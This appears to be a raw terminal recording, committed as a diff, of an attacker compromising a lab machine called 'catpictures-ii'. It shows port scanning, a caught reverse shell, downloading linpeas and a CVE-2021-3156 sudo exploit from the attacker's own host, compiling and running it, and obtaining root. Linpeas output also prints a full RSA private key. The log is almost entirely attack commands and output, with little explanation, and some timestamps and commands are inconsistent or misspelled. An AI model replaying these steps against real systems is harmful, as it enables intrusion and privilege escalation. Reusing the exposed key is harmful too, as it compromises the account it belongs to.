@@ -1,0 +1,292 @@
+Script started on 2025-06-10 04:40:02-04:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="89" LINES="18"]
+                                                                                        
+lukewago@53cUr17y: ~/Desktop/Catphotos
+
+ping -c 5 8.8.8.8
+
+PING xxx-xxx-xxx (xxx-xxx-xxx) 56(84) bytes of data.
+
+--- xxx-xxx-xxx ping statistics ---
+ 5 packets transmitted, 0 received, 100% packet loss, time 4088ms
+
+hping -c 5 xxx-xxx-xxx
+
+PING xxx-xxx-xxx (xxx-xxx-xxx) 56(84) bytes of data.
+ 64 bytes from xxx-xxx-xxx: icmp_seq=1 ttl=61 time=807 ms
+ 64 bytes from xxx-xxx-xxx: icmp_seq=2 ttl=61 time=831 ms
+ 64 bytes from xxx-xxx-xxx: icmp_seq=3 ttl=61 time=865 ms
+ 64 bytes from xxx-xxx-xxx: icmp_seq=4 ttl=61 time=777 ms
+
+--- xxx-xxx-xxx ping statistics ---
+ 5 packets transmitted, 4 received, 20% packet loss, time 3999ms
+ rtt min/avg/max/mdev = 777.315/819.975/864.962/32.132 ms  
+
+xxx-xxx-xxx
+
+Initiating Ping Scan at 04:41
+Scanning xxx-xxx-xxx [4 ports]
+Completed Ping Scan at 04:41, 1.33s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 04:41
+Completed Parallel DNS resolution of 1 host. at 04:41, 0.08s elapsed
+DNS resolution of 1 IPs took 0.08s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating SYN Stealth Scan at 04:41
+Scanning xxx-xxx-xxx [5 ports]
+ Discovered open port 22/tcp on xxx-xxx-xxx
+ Discovered open port 8080/tcp on xxx-xxx-xxx
+ Discovered open port 222/tcp on xxx-xxx-xxx
+ Discovered open port 80/tcp on xxx-xxx-xxx
+ Discovered open port 1337/tcp on xxx-xxx-xxx
+Host is up, received reset ttl 60 (1.1s latency).
+Scanned at 2025-06-10 04:41:48 EDT for 1s
+
+PORT     STATE SERVICE    REASON
+ 22/tcp   open  ssh        syn-ack ttl 61
+ 80/tcp   open  http       syn-ack ttl 60
+ 222/tcp  open  rsh-spx    syn-ack ttl 60
+ 1337/tcp open  waste      syn-ack ttl 61
+ 8080/tcp open  http-proxy syn-ack ttl 61                                                                                        
+
+binwalk f5054e97620f168c7b5088c85ab1d6e4.jpg
+ DECIMAL       HEXADECIMAL     DESCRIPTION
+ --------------------------------------------------------------------------------
+ 0             0x0             JPEG image data, JFIF standard 1.01
+ 2410315       0x24C74B        JBOOT STAG header, image id: 8, timestamp 0xD2652142, image size: 235061380 bytes, image JBOOT checksum: 0x1004, header JBOOT checksum: 0xB9B2
+ 3000984       0x2DCA98        JBOOT STAG header, image id: 8, timestamp 0xFDE3CFD4, image size: 2637202076 bytes, image JBOOT checksum: 0xBE39, header JBOOT checksum: 0x87F9
+ 5828314       0x58EEDA        JBOOT STAG header, image id: 1, timestamp 0xB8FDD238, image size: 4162665232 bytes, image JBOOT checksum: 0x7531, header JBOOT checksum: 0x421E
+ 7168337       0x6D6151        JBOOT STAG header, image id: 0, timestamp 0x2A5F72CB, image size: 3183228553 bytes, image JBOOT checksum: 0x5128, header JBOOT checksum: 0xDB69
+
+ExifTool Version Number         : 13.25
+File Name                       : f5054e97620f168c7b5088c85ab1d6e4 (1).jpg
+ Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt
+ Profile CMM Type                : Little CMS
+ Profile Version                 : 2.1.0
+
+listening on [any] 9001 ...
+ connect to [xxx-xxx-xxx] from (UNKNOWN) [xxx-xxx-xxx] 53676
+id
+ uid=1000(bismuth) gid=1000(bismuth) groups=1000(bismuth),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare)
+dir /home/
+ bismuth
+python3 -c 'import pty;pty.spwawn'("/bin/bash")'
+ bismuth@catpictures-ii:~$ export TERM=xterm
+ export TERM=xterm
+
+bismuth@catpictures-ii:~$ ls -al
+ ls -al
+
+total 56
+
+ drwxr-xr-x 8 bismuth bismuth 4096 Mar 20  2023 
+ drwxr-xr-x 3 root    root    4096 Nov  7  2022 
+ drwxr-xr-x 3 bismuth bismuth 4096 Nov  7  2022 
+ lrwxrwxrwx 1 bismuth bismuth    9 Nov  7  2022 bash_history -> /dev/null
+ -rw-r--r-- 1 bismuth bismuth  220 Nov  7  2022 .bash_logout
+ -rw-r--r-- 1 bismuth bismuth 3771 Nov  7  2022 .bashrc
+
+bismuth@catpictures-ii:~$ find / -name flag3.txt 2>/dev/null
+ find / -name flag3.txt 2>/dev/null
+
+bismuth@catpictures-ii:~$ cd /tmp
+ cd /tmp
+
+bismuth@catpictures-ii:/tmp$ ls -al
+  ls -al
+
+total 44
+
+ drwxrwxrwt 11 root    root    4096 Jun 10 01:59 
+
+ drwxr-xr-x 23 root    root    4096 Mar 20  2023
+
+ drwx------  2 bismuth bismuth 4096 Jun 10 01:59 ansible_kHzlji
+
+ drwxrwxrwt  2 root    root    4096 Jun 10 01:39 font-unix
+
+ drwxrwxrwt  2 root    root    4096 Jun 10 01:39 ICE-unix
+
+ drwx------  2 root    root    4096 Jun 10 01:39 snap-private-tmp
+
+ drwx------  3 root    root    4096 Jun 10 01:39 systemd-private-c5ad0fd1b42243598dc312792a765b30-systemd-resolved.service-iw47fE
+
+ drwx------  3 root    root    4096 Jun 10 01:39 systemd-private-c5ad0fd1b42243598dc312792a765b30-systemd-timesyncd.service-6uOkAZ
+
+ drwxrwxrwt  2 root    root    4096 Jun 10 01:39 Test-unix
+
+ drwxrwxrwt  2 root    root    4096 Jun 10 01:39 X11-unix
+
+ drwxrwxrwt  2 root    root    4096 Jun 10 01:39 XIM-unix
+
+bismuth@catpictures-ii:/tmp$ wget http://xxx-xxx-xxx:8001/linpeas.sh
+ wget http://xxx-xxx-xxx:8001/linpeas.sh
+
+--2025-06-10 02:02:44--  http://xxx-xxx-xxx:8001/linpeas.sh
+
+Connecting to xxx-xxx-xxx:8001... connected.
+
+ HTTP request sent, awaiting response... 200 OK
+
+ Length: 840139 (820K) [text/x-sh]
+
+ Saving to: ‘linpeas.sh’
+    
+linpeas.sh          100%[===================>] 820.45K  62.7KB/s    in 18s     
+
+ 2025-06-10 02:03:04 (45.1 KB/s) - ‘linpeas.sh’ saved [840139/840139]
+
+bismuth@catpictures-ii:/tmp$ chmod +x linpeas.sh
+ chmod +x linpeas.sh
+
+bismuth@catpictures-ii:/tmp$ ./linpeas.sh
+ ./linpeas.sh
+
+Starting LinPEAS. Caching Writable Folders...
+
+ Basic information
+ Linux version 4.15.0-206-generic (buildd@lcy02-amd64-070) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #217-Ubuntu SMP Fri Feb 3 19:10:13 UTC 2023
+
+ User & Groups:uid=1000(bismuth) gid=1000(bismuth) groups=1000(bismuth),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare)
+
+ Hostname:catpictures-ii
+
+
+CVE-2021-3156 sudo Baron Samedit
+
+
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+
+   Exposure: probable
+
+   Tags: mint=19,[ ubuntu=18|20 ], debian=10
+
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+
+-rw------- 1 bismuth bismuth 1679 Nov  7  2022 /home/bismuth/.sshid_rsa
+
+-----BEGIN RSA PRIVATE KEY-----
+
+ MIIEpQIBAAKCAQEA2epfgbqSrWGvHLh3a3K2X/6flpaL2ccuKMjnkBfxJhPK721K
+ uuqJIyB0iMoWmBFo+10TX3L8LRd5rgVKiTyv0QhVcHX2tFK5ma88a2xAuaMe5BJP
+ DwDkVfS2lnxgfBO9U4d73IK7963QwMF3u98bueJZkKkrFr4jfvbkDJOP24a95H4v
+ iYxjtXZut3vPlaONXwPzQfhV/cPRaSKHTQFcSkyn8hllxTF29ZPyDYAkSFytlJ33
+ epDVy/fv2Fc8mKCg+tKWEfsh2E3QPM2pXuAhXKVAyxK2RUnBNNZ4V+aYe3AmL6Q8
+ 1BNDvSN+K04N3KanmFgrnIwOYvYUfTPdVIoVhwIDAQABAoIBAQDGoiawf7qXpEUU
+ bukb3hJzagtaHpwXxMFEl+zLoadEyCHhIMRPoN2kUT8oON1je+svxOWVyaAoEg/u
+ GhCZC+JPLcODoWNhd06K0frHCIPvMstDpZS+3ldEKq4Meg8QyoV3EDZNCDYCTEPO
+ kAtuCq6hP7vYavtF3cdJQg8Zj6A/vuCCDcmttDN/LDcUOaEQd5e/aYL66wUViVxu
+ HTu6cD6IT4VTD+N2ZObaYZbA3Evng0pS64OLlilhmomrcZGGbwV+BVOcnkF/fbD9
+ U486bH1h+F6VmX8KOjGgL/6UvcoE20T9hPkoJOhNMDo7K1dfuIkaMJu/2QIdf7Bc
+ +zvGEspBAoGBAP+0xSiQkw0IxcPY4BIOph/xfm2uEVWl1lH/11eN4Y8JsjLYIux0
+ 5E2EIWeEYZx4BM1QtwqTO9ZjbnG7rbNV5Ck6jCA2tmxR77SdBuyKokswgdGgA9Ai
+ /2arzy+kSMDrRnVxD1XQ+5urcfjAwzrYN98iezNJ1V/TB8E4+xXiWvh3AoGBANoq
+ fBlOvfjr9e9s2Hv+r7T2sPCHyIYSFSwAv7/ftdq9h88b6Wa2w2YTZgpFtKt4EWHa
+ rfZPQyYzWxorHaYO9TlB2C6XRMBeMy74+EhlN5bgGYYp5prmqIwDO2HhHf0gQeus
+ cjJNKR8vY4wASKoNmGP7dyQeIydQQEVYPqwrFB9xAoGAOS30NJj3uR9wEdZqbL9H
+ 2LbI3b/h8nQOE/IQ9mwsty6k4YfBb3zIHKliSuKobTPNZxgYhk3cQJmlddtRAVxA
+ lBOaiA2UB27fGlVO2hA6MHQdY4HTuHRLBmt+/hlPh4xVCigJFNiRmwLgjo6UWZFG
+ FSiBwjtNcosfHc8fHoqqawsCgYEAs5SpFkPkyFOi23RjNp3MkE9IEpYSj5mu58uu
+ Cwjgrq+4bNjy5OOoMAvjwKzkLQjmdgAFlmxkP7uiUAYRn7FMVddHVgKaSya/RvkV
+ lrIKch0BpZg0BGm9b5LxfH5LqyK0YIRQc+tj4BGoBYPuTFxohlRmG8ra8O90GCCt
+ ZhcHt2ECgYEAgB3lB0wO5ZP+T84RWE0cQNKs3aMXqgU9IMN5qHdt9faDG7bVt8aY
+ gnff4aoDJsz6mV+xjeVRONDgNCBtS8/vE4OW+MRoXrLoK35CDg6MtBL8rxDwx7aC
+ PXrqJoUuYPPMjeeqcv0LbXDT3a/mkj074aB5LWcEYxNkIyJGC5EbRkU=
+ -----END RSA PRIVATE KEY-----
+
+
+
+cd /tmp
+
+bismuth@catpictures-ii:/tmp$ wget http://xxx-xxx-xxx:8001/CVE.tar
+wget http://xxx-xxx-xxx:8001/CVE.tar
+
+--2025-06-10 02:38:48--  http://xxx-xxx-xxx:8001/CVE.tar
+
+Connecting to xxx-xxx-xxx:8001... connected.
+
+HTTP request sent, awaiting response... 200 OK
+
+Length: 20480 (20K) [application/x-tar]
+
+Saving to: ‘CVE.tar’
+
+CVE.tar             100%[===================>]  20.00K  27.2KB/s    in 0.7s    
+
+bismuth@catpictures-ii:/tmp$ dir
+dir
+ ansible_HpR6WZ
+ CVE.tar
+ linpeas.sh
+ pspy64
+ snap-private-tmp
+ systemd-private-c5ad0fd1b42243598dc312792a765b30-systemd-resolved.service-iw47fE
+  systemd-private-c5ad0fd1b42243598dc312792a765b30-systemd-timesyncd.service-6uOkAZ
+ tmux-1000
+
+bismuth@catpictures-ii:/tmp$ tar -xvf CVE.tar
+ tar -xvf CVE.tar
+ CVE/
+  CVE/brute.sh
+  CVE/makefile
+  CVE/lib.c
+  CVE/hax.c
+bismuth@catpictures-ii:/tmp$ dir
+dir
+ ansible_HpR6WZ
+ CVE
+ CVE.tar
+ linpeas.sh
+
+snap-private-tmp
+ systemd-private-c5ad0fd1b42243598dc312792a765b30-systemd-resolved.service-iw47fE
+ systemd-private-c5ad0fd1b42243598dc312792a765b30-systemd-timesyncd.service-6uOkAZ
+ tmux-1000
+bismuth@catpictures-ii:/tmp$ cd CVE
+cd CVE
+bismuth@catpictures-ii:/tmp/CVE$ dir
+dir
+ brute.sh  hax.c  lib.c	makefile
+-rw-r--r--  1 bismuth bismuth 1994 Jun  9 06:17 brute.sh
+-rw-r--r--  1 bismuth bismuth 4420 Jun  9 06:18 hax.c
+-rw-r--r--  1 bismuth bismuth  407 Jun  9 06:18 lib.c
+-rw-r--r--  1 bismuth bismuth  264 Jun  9 06:16 makefile
+
+bismuth@catpictures-ii:/tmp/CVE$ make
+make
+ rm -rf libnss_X
+ mkdir libnss_X
+ gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
+ gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
+
+bismuth@catpictures-ii:/tmp/CVE$ dir
+dir
+ brute.sh  hax.c  lib.c	libnss_X  makefile  sudo-hax-me-a-sandwich
+bismuth@catpictures-ii:/tmp/CVE$ ./sudo-hax-me-a-sandwich
+./sudo-hax-me-a-sandwich
+ ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+   usage: ./sudo-hax-me-a-sandwich <target>
+   available targets:
+  -----------------------------------------------------------
+
+    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
+
+    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
+
+    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
+
+  ------------------------------------------------------------
+  manual mode:
+   ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
+
+bismuth@catpictures-ii:/tmp/CVE$./sudo-hax-me-a-sandwich 0
+ ./sudo-hax-me-a-sandwich 0
+
+ ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+ using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
+# id
+ id
+ uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1000(bismuth)
+ #pwd
+ /tmp/CVE
+cat /root/flag*
+                                                                                        
+                                    Done on 2025-06-10 05:42:57-04:00 [COMMAND_EXIT_CODE="0"]
